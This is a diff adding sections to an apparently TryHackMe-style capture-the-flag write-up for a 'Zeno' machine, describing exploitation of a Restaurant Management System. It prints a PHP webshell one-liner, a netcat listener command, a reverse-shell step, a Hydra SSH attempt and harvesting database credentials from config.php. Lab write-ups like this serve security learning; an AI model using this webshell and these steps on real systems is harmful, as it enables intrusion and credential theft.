@@ -8,6 +8,7 @@ Table of Contents
 * [Port Scan](#Port-scan)
 * [Enumerating the Webserver](#Enumerating-the-Webserver)
 * [Remote Code Execution](#Remote-Code-Execution)
+* [Gaining Access](#Gaining-Access)
 
 # Port scan
 Firstly, I have set an environment variable `IP` of the target machine's IP address.
@@ -147,5 +148,31 @@ The Google search of `restaurant management system exploit` led to a Remote Code
 
 # Remote Code Execution
 
-The downloaded exploit had minor formatting issues.
-Although when I had tried running the exploit I got `[Errno 111] Connection refused` error with the `127.0.0.1:8080` proxy address.
+The downloaded exploit had formatting issues and a broken hardcoded proxy.
+Fixing formatting and deleting code for proxy led to a successful upload of a webshell `<?php echo shell_exec($_GET["cmd"]); ?>` at http://$IP:12340/rms/images/reverse-shell.php URL, which shows blank page.
+
+![Blank exploit page](/Zeno/images/Blank_exploit_page.png)
+
+Although the uploaded webshell can accept commands with the syntax of http://$IP:12340/rms/images/reverse-shell.php?cmd=<argument>. For example, id argument prints this:
+
+![System ID](/Zeno/images/System_ID.png)
+
+At this point I am doing the following:
+
+1. Exporting 1234 as a listening port - LPORT - and setting up a netcat listener with `nc -lnvp $LPORT`.
+2. Passing a Python reverse shell found at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) as an argument to the webshell URL.
+
+The webpage is blank, but the listener captured a shell connection!
+
+
+![Reverse shell](/Zeno/images/Reverse_shell.png)
+
+# Gaining Access
+
+Going to the server's home directory shows that the user `edward` is on the system.
+Tried Hydra for cracking edward's SSH password but no luck there.
+Getting back to /var/www/html/rms/connection folder and listing it's contets shows a config.php file. Inside this file there are credentials for the root user of a database.
+
+![Database credentials](/Zeno/images/Database_credentials.png)
+
+Although connecting to mysql database from the shell with these credentials resulted in an error.
